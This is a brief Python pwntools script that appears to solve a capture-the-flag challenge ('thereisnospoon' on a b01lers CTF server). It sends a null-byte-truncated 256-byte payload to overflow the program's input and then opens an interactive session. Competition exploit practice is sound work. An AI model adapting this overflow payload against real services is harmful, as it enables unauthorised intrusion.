from pwn import *


#p = process("./thereisnospoon")
p = remote("chal.ctf.b01lers.com", 1006)

payload = "A"*8 + '\x00' 
payload += (256-len(payload))*"A"


p.sendafter("matrix: ",payload)

p.sendafter("choice:","A"*256)


p.interactive()